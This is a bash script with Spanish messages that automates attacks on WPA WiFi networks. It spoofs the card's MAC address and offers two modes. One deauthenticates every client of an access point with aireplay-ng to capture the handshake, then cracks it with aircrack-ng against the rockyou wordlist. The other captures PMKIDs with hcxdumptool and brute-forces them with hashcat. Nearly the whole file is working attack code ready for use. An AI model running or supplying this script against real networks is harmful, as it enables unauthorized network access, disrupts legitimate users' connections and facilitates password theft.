#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

ctrl_c(){
  echo -e "\n${yellowColour}[!] Saliendo...${endColour}"
  tput cnorm; airmon-ng stop ${name_interface} > /dev/null 2>&1
#  rm Captura* 2>/dev/null
  exit 1
}

trap ctrl_c INT

helpPanel(){

  echo -e "\n${redColour}[!] Uso: $0 ${endColour}"
  echo -e "\t${purpleColour}a)${endColour} ${grayColour}Modos de ataque:${endColour}"
  echo -e "\t\t${yellowColour}Handshake${endColour}"
  echo -e "\t\t${yellowColour}PKMID${endColour}"
  echo -e "\t${purpleColour}n)${endColour}${grayColour} Nombre de la tarjeta de red${endColour}"
  echo -e "\t${purpleColour}h)${endColour} ${grayColour}Mostrar este panel de ayuda${endColour}\n"
  exit 0
}

dependencies(){
  tput civis
  clear; dependencies=(aircrack-ng macchanger)

  echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n${endColour}"
  sleep 2
  
  for program in "${dependencies[@]}";do #Iterando por elementos de la variable dependencies
    echo -ne "${yellowColour}[*]${endColour}${blueColour} Herramienta ${endColour}${purpleColour}$program${endColour}${blueColour}...${endColour}"
  
    test -f /usr/bin/$program

    if [ "$(echo $?)" == "0" ]; then
      
      echo -e " ${greenColour}(V)${endColour}"
    
    else
      echo -e " ${redColour}(X)${endColour}"
      echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando la herramienta${endColour}${purpleColour} $program\n${endColour}${yellowColour}...${endColour}"
      
      apt-get install $program -y > /dev/null 2>&1

    fi; sleep 1
  done
}

startAttack(){
  
    clear 
    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...\n${endColour}"
    airmon-ng start $networkCard > /dev/null 2>&1
    #name_interface=$(cat temp.txt | grep -i "Interface" | awk '{print $2}' | sed 's/sometimes//' | xargs | awk '{print $2}')
    #echo "El nombre nuevo de la interfaz es ${name_interface}"
    echo -e "${yellowColour}[!]${endColour}${grayColour} Escribe el nuevo Nombre de la tarjeta de red${endColour}"
    tput cnorm; read name_interface
    ifconfig ${name_interface} down && macchanger -a ${name_interface} > /dev/null 2>&1
    ifconfig ${name_interface} up; killall dhclient wpa_supplicant 2>/dev/null

  if [ "$(echo $attack_mode)" == "Handshake" ]; then
  
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Nueva direccion MAC asignada${endColour}${purpleColour}(${endColour}${blueColour}$(macchanger -s ${name_interface} | grep -i "current" | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour})${endColour}" 

    xterm -hold -e "airodump-ng ${name_interface}" &
    airodump_xterm_PID=$!
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read ap_name
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read ap_channel
    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null

    sleep 3; xterm -hold -e "airodump-ng -c $ap_channel -w Captura --essid $ap_name ${name_interface}" &
    airodump_filter_xterm_PID=$!

    xterm -hold -e "aireplay-ng -0 20 -e $ap_name -c FF:FF:FF:FF:FF:FF ${name_interface}" &
    aireplay_xterm_PID=$!
    sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null


    sleep 10; kill -9 $airodump_filter_xterm_PID
    wait $airodump_filter_xterm_PID 2>/dev/null

    xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
  
  elif [ "$(echo $attack_mode)" == "PKMID" ];then
     
    clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
    sleep 2
    timeout 60 bash -c "hcxdumptool -i ${name_interface} --enable_status=1 -o Captura"
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
    sleep 2
    hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
    
    #test -f myHashes
    
    #if [ "$(echo $!)" == "0" ]; then
      
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
    sleep 2

    hashcat -m 16800 /usr/share/wordlists/rockyou.txt -d 1 --force 
    
    #else
      
    #echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha encontrado el paquete necesario...${endColour}\n"
    #sleep 2
    #fi 
  else
    
    echo -e "\n${redColour}[!] Este modo de ataque no es válido${endColour}"
  fi
}
#Main Function


if [ "$(id -u)" == "0" ]; then
  
  declare -i parameter_counter=0;while getopts ":a:n:h:" arg; do
  
    case $arg in
      a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
      n) networkCard=$OPTARG; let parameter_counter+=1 ;;
      h) helpPanel;;
    esac

  done
  
  if [ $parameter_counter -ne 2 ]; then
    helpPanel
  else
    dependencies
    startAttack
    tput cnorm; airmon-ng stop ${name_interface} > /dev/null 2>&1
  fi

else
  echo -e "${redColour}\n[!] No eres root${endColour}"
fi

